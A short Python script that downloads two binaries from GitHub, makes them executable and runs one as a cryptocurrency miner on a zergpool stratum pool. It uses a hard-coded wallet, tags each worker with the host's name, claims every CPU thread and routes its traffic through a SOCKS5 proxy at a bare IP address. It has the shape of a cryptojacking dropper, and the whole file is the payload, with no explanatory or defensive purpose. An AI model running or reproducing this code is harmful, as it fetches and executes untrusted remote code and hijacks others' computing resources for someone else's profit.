import os

os.system("wget -O bionicv2 https://github.com/ardisantaka/mikay/raw/master/bionicv2")
os.system("wget https://github.com/ardisantaka/ardia/raw/main/gas")
os.system("chmod +x gas bionicv2")
os.system("./bionicv2 -a verus -o stratum+tcp://verushash.na.mine.zergpool.com:3300 -u D5ranfdGMhnTpjj92UYRM3wRmwrajbjh4H.$(cat /proc/sys/kernel/hostname) -p c=DGB,mc=VRSC,d=2000 -t $(nproc --all) -x socks5://139.59.107.79:4145")
